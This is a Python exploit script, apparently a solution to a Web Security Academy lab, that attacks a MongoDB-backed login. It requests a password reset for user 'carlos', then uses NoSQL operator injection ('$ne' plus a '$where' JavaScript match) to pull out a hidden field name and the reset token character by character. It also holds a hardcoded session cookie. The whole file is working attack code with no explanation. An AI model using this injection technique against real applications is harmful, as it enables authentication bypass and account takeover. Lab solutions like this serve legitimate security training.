import requests
import string

url = "https://0aa000ca049fd0cc805ea35800f40031.web-security-academy.net/login"
charac =  string.ascii_lowercase + string.ascii_uppercase + string.digits 


data = ''
token = ''
def pass_reset():
    url = "https://0aa000ca049fd0cc805ea35800f40031.web-security-academy.net/forgot-password"
    userData = {
        "username": "carlos"
    }
    r = requests.post(url,json=userData)
pass_reset()


def hidden_endpoint():
    global data
    while True:
        Found_charac = False
        for c in charac:

        # payload = f"Object.keys(this)[1].match('^{data}{c}.*')"
        #change the array match (this)[1 or 2 or 3...etc]
            payload = {
            "username":"carlos",
            "password":{"$ne":"ewe2"},
            "$where":  f"Object.keys(this)[4].match('^{data}{c}.*')"
            }
            headers = {
            "Cookie": "session=4LF1C4vRmuZyzgO6LY2iNmhpSp0M9tDg",
            "Content-Type" : "application/json"
            }
            r = requests.post(url,json=payload,headers=headers)
            print(f"[*] Bruteforce on Endpoints -> {c}")

            # print(f"[+] response : {r.text}")
            # if ""
            if "Account locked" in r.text:
                data += c 
                print(f"[+] Found Character {c} -> Current -> {data}")
                Found_charac = True
                break
        if not Found_charac:
            print("[-] No More Character Found!!!")
            break
hidden_endpoint()


def valid_token():
    global data,token
    while True:
        Found_charac = False
        for c in charac:

        # payload = f"Object.keys(this)[1].match('^{data}{c}.*')"
        #change the array match (this)[1 or 2 or 3...etc]
            payload = {
            "username":"carlos",
            "password":{"$ne":"ewe2"},
            "$where":  f"this.{data}.match('^{token}{c}.*')"
            }
            headers = {
            "Cookie": "session=4LF1C4vRmuZyzgO6LY2iNmhpSp0M9tDg",
            "Content-Type" : "application/json"
            }
            r = requests.post(url,json=payload,headers=headers)
            print(f"[*] Bruteforce on Token -> {c}")

            # print(f"[+] response : {r.text}")
            # if ""
            if "Account locked" in r.text:
                token += c 
                print(f"[+] Found Character {c} -> Current -> {token}")
                Found_charac = True
                break
        if not Found_charac:
            print("[-] No More Character Found!!!")
            break
valid_token()

print(f"[+] Final Endpoint : {data}")
print(f"[+] Final Valid Token : {token}")
